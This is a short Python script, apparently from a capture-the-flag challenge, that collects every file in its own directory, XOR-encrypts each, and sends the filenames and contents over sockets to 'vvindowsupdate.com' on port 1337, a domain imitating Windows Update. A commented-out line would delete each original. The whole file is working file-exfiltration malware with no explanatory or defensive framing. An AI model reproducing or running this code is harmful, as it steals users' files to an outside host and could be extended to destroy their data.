import socket
import base64
import os
from random import randbytes
from pwn import xor

# DON'T FORGET TO CHANGE THIS TO THE REAL KEY!!!!
key = b'broken'

def encrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()
   
    encrypted = xor(data, key)
    return encrypted

def send_encrypted(filename):
    print(f'sending {filename}')
    data = encrypt(filename)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall((f'Sending: {filename}').encode())
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall(data)
    s.close()

def get_all_files():
    file_paths = []
    for root, dirs, files in os.walk(os.path.dirname(os.path.realpath(__file__))):
        for file in files:
            file_paths.append(os.path.join(root, file))
    file_paths.remove(__file__)      
    return file_paths

files = get_all_files()
for f in files:
    send_encrypted(f)
    #os.remove(f)
